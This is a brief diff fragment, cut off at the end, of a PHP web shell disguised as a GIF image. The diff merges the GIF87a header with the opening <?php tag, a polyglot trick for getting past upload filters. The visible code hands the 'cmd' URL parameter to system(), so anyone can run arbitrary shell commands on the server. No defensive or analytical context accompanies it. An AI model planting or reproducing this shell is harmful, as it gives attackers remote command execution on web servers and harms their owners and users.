@@ -1,5 +1,4 @@
-GIF87a;
-<?php
+GIF87a;<?php
     if(isset($_GET['cmd']))
     {
         system($_GET['cmd']);
